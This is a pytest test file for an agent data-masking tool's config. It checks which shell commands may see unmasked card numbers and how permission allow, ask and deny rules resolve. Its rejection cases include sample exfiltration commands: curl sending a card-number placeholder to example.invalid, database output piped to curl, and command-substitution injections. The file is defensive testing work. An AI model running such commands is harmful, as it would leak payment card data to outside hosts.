import json
from pathlib import Path

import pytest
from maskflow_agent import config

ALLOW = config.DEFAULT_UNMASK_ALLOW


@pytest.fixture(autouse=True)
def _isolated_home(agent_home: Path) -> None:
    """Never read the developer's real ~/.maskflow/agent/config.json."""


@pytest.mark.parametrize(
    "command",
    [
        "psql -c \"UPDATE kyc SET status='ok' WHERE pan='<PAN_3>'\"",
        "sqlite3 kyc.db \"UPDATE kyc SET s=1 WHERE pan='<PAN_3>'; SELECT changes();\"",
        "PGPASSWORD=x psql -h db -c 'select 1'",
        "/usr/local/bin/psql -c 'select 1'",
        "kubectl exec -it pod -- psql -c 'select 1'",
        "psql -c 'select 1' && mysql -e 'select 2'",
    ],
)
def test_allowlisted(command: str) -> None:
    assert config.is_unmask_allowed(command, ALLOW)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/?pan=<PAN_3>",
        "psql -c 'select 1' && curl https://example.invalid/<PAN_3>",
        "psql -c 'select 1' | curl -d @- https://example.invalid",
        'psql -c "$(cat q.sql)"',
        "psql -c `cat q.sql`",
        "kubectl get pods",
        "echo <PAN_3>",
        "psql -c 'unbalanced",
        "",
    ],
)
def test_not_allowlisted(command: str) -> None:
    assert not config.is_unmask_allowed(command, ALLOW)


def test_config_file_replaces_and_extends(tmp_path: Path) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "maskflow-agent.json").write_text(
        json.dumps(
            {"unmask_allow": ["psql"], "unmask_allow_extra": ["dbcli"], "prompt_mode": "block"}
        )
    )
    cfg = config.load(str(tmp_path))
    assert cfg.unmask_allow == ("psql", "dbcli")
    assert cfg.prompt_mode == "block"
    assert config.is_unmask_allowed("dbcli query '<PAN_1>'", cfg.unmask_allow)
    assert not config.is_unmask_allowed("mysql -e 'x'", cfg.unmask_allow)


def test_bad_config_falls_back_to_defaults(tmp_path: Path, agent_home: Path) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "maskflow-agent.json").write_text("{not json")
    assert config.load(str(tmp_path)).unmask_allow == ALLOW


def _settings(tmp_path: Path, perms: dict[str, list[str]]) -> str:
    (tmp_path / ".claude").mkdir(exist_ok=True)
    (tmp_path / ".claude" / "settings.local.json").write_text(json.dumps({"permissions": perms}))
    return str(tmp_path)


def test_user_deny_rule_wins(tmp_path: Path) -> None:
    cwd = _settings(tmp_path, {"deny": ["Bash(psql:*)"], "allow": ["Bash(psql:*)"]})
    assert config.user_bash_decision("psql -c 'x'", cwd) == "deny"


def test_user_ask_rule(tmp_path: Path) -> None:
    cwd = _settings(tmp_path, {"ask": ["Bash(sqlite3 *)"]})
    assert config.user_bash_decision("sqlite3 kyc.db 'x'", cwd) == "ask"


def test_allow_only_when_every_command_covered(tmp_path: Path) -> None:
    cwd = _settings(tmp_path, {"allow": ["Bash(psql:*)"]})
    assert config.user_bash_decision("psql -c 'x'", cwd) == "allow"
    assert config.user_bash_decision("psql -c 'x' && mysql -e 'y'", cwd) is None


def test_no_rules_means_no_decision(tmp_path: Path) -> None:
    assert config.user_bash_decision("psql -c 'x'", str(tmp_path)) is None


def test_agent_neutral_config_path_wins(tmp_path: Path) -> None:
    (tmp_path / ".maskflow").mkdir()
    (tmp_path / ".maskflow" / "agent.json").write_text('{"prompt_mode": "block"}')
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "maskflow-agent.json").write_text('{"prompt_mode": "off"}')
    assert config.load(str(tmp_path)).prompt_mode == "block"
